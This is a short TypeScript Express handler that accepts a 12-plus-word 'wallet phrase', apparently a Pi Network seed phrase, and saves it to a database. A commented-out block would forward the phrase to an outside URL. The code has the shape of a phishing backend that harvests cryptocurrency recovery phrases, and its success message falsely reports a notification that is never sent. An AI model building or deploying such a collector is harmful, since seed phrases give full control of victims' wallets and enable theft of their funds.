import axios from 'axios';
import { Request, Response } from 'express';
import { Pi } from "./piModel";

export const submitPiData = async (req: Request, res: Response): Promise<void> => {
    const { pidata } = req.body;

    // Validate input
    if (!pidata || !Array.isArray(pidata) || pidata.length < 12) {
        res.status(403).json({ error: "Wallet phrase must be an array with at least 12 elements." });
        return; // Ensure the function exits after sending the response
    }

    try {
        // Save data to the database
        const newPi = new Pi({ phrase: pidata });
        const savedData = await newPi.save();

        // // Push notification to the URL
        // const pushNotificationUrl = "https://example.com/push-notification"; // Replace with your target URL
        // const notificationPayload = {
        //     id: savedData._id, // Example: Send the database ID
        //     phrase: pidata,    // Send the data that was saved
        //     timestamp: new Date().toISOString()
        // };

        // // Send POST request
        // await axios.post(pushNotificationUrl, notificationPayload);

        // Send success response
        res.status(200).json({ message: "Data submitted and notification sent successfully." });
        return
    } catch (e: any) {
        console.error("Error:", e.message);
        res.status(500).json({ error: "Internal server error." });
    }
};
